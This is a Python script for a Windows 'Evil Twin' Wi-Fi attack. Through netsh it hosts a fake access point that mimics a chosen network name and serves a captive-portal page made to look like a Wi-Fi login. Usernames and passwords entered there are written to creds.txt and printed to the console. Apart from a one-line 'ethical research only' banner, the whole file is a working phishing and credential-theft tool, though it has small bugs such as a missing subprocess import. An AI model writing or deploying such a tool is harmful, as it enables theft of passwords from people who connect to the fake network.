import os
import sys
import time
import random
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init

init(autoreset=True)  # Colorama init

# Global variables
LOG_FILE = "creds.txt"
CREDENTIALS = []
PORTAL_PORT = 8080
STOP_SERVER = False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{Fore.RED}
   ▄████████ ███▄▄▄▄      ▄██████▄     ▄████████    ▄█   ▄█▄    ▄████████ 
  ███    ███ ███▀▀▀██▄   ███    ███   ███    ███   ███ ▄███▀   ███    ███ 
  ███    █▀  ███   ███   ███    ███   ███    █▀    ███▐██▀     ███    █▀  
  ███        ███   ███  ▄███▄▄▄▄██▀  ▄███▄▄▄       ▄█████▀     ▄███▄▄▄     
▀███████████ ███   ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀      ▀▀█████▄    ▀▀███▀▀▀     
         ███ ███   ███ ▀███████████   ███    █▄     ███▐██▄     ███    █▄ 
   ▄█    ███ ███   ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███ 
 ▄████████▀   ▀█   █▀    ███    ███   ██████████   ███   ▀█▀   ██████████ 
                          ███    ███                                      
    {Fore.RESET}{Fore.CYAN}[ Evil Twin with Captive Portal - Windows 11 ]{Fore.RESET}
    {Fore.YELLOW}⚠ WARNING: For Ethical Security Research Only! ⚠{Fore.RESET}
    """
    print(banner)

def log_credentials(username, password):
    """Save captured credentials to file"""
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    CREDENTIALS.append((username, password))
    print(f"{Fore.RED}[!] Captured Credentials: {username}:{password}{Fore.RESET}")

class CaptivePortalHandler(BaseHTTPRequestHandler):
    """HTTP server handler for fake login page"""
    
    def do_GET(self):
        if self.path == '/login':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            login_page = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Wi-Fi Login</title>
                <style>
                    body { font-family: Arial, sans-serif; background: #f5f5f5; }
                    .login-box { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
                    button { background: #4CAF50; color: white; border: none; padding: 10px; width: 100%; border-radius: 3px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>Wi-Fi Login Required</h2>
                    <form action="/auth" method="post">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Connect</button>
                    </form>
                </div>
            </body>
            </html>
            """
            self.wfile.write(login_page.encode())
        
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_page = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Connection Successful</title>
                <style>
                    body { font-family: Arial, sans-serif; background: #f5f5f5; }
                    .success-box { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
                    .success { color: #4CAF50; font-size: 24px; }
                </style>
            </head>
            <body>
                <div class="success-box">
                    <div class="success">✓</div>
                    <h2>Connected Successfully</h2>
                    <p>You are now connected to the Wi-Fi network.</p>
                </div>
            </body>
            </html>
            """
            self.wfile.write(success_page.encode())
        
        else:
            # Redirect all other requests to login page
            self.send_response(302)
            self.send_header('Location', '/login')
            self.end_headers()

    def do_POST(self):
        if self.path == '/auth':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            # Parse username and password
            username = post_data.split('username=')[1].split('&')[0]
            password = post_data.split('password=')[1].split('&')[0]
            
            # Log credentials
            log_credentials(username, password)
            
            # Redirect to success page
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()

def start_captive_portal():
    """Start the HTTP server for captive portal"""
    server = HTTPServer(('0.0.0.0', PORTAL_PORT), CaptivePortalHandler)
    print(f"{Fore.GREEN}[+] Captive portal running on http://localhost:{PORTAL_PORT}{Fore.RESET}")
    
    while not STOP_SERVER:
        server.handle_request()

def enable_wifi_support():
    """Enable Wi-Fi hosted network support"""
    try:
        subprocess.run('netsh wlan set hostednetwork mode=allow', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Hosted network support enabled.{Fore.RESET}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to enable hosted network. Run as Admin!{Fore.RESET}")
        sys.exit(1)

def create_fake_wifi(ssid, password=None):
    """Create fake Wi-Fi network"""
    try:
        if password:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" key="{password}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created with password: {password}{Fore.RESET}")
        else:
            subprocess.run(f'netsh wlan set hostednetwork ssid="{ssid}" keyUsage=persistent', shell=True, check=True)
            print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' created (Open Network){Fore.RESET}")
        
        subprocess.run('netsh wlan start hostednetwork', shell=True, check=True)
        print(f"{Fore.GREEN}[+] Fake Wi-Fi '{ssid}' is now active!{Fore.RESET}")
        return True
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}[-] Failed to create fake Wi-Fi.{Fore.RESET}")
        return False

def main():
    clear_screen()
    print_banner()
    enable_wifi_support()

    # Start captive portal in background
    portal_thread = threading.Thread(target=start_captive_portal)
    portal_thread.daemon = True
    portal_thread.start()

    # Create fake Wi-Fi
    ssid = input(f"{Fore.YELLOW}[?] Enter SSID to mimic: {Fore.RESET}")
    has_pass = input(f"{Fore.YELLOW}[?] Add password? (y/n): {Fore.RESET}").lower()
    
    if has_pass == 'y':
        password = input(f"{Fore.YELLOW}[?] Enter fake password: {Fore.RESET}")
        create_fake_wifi(ssid, password)
    else:
        create_fake_wifi(ssid)

    print(f"\n{Fore.CYAN}[*] Users will now see a login page when connecting.")
    print(f"[*] Captured credentials will appear below and save to {LOG_FILE}{Fore.RESET}")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopping fake Wi-Fi and captive portal...{Fore.RESET}")
        subprocess.run('netsh wlan stop hostednetwork', shell=True)
        STOP_SERVER = True
        sys.exit(0)

if __name__ == "__main__":
    main()
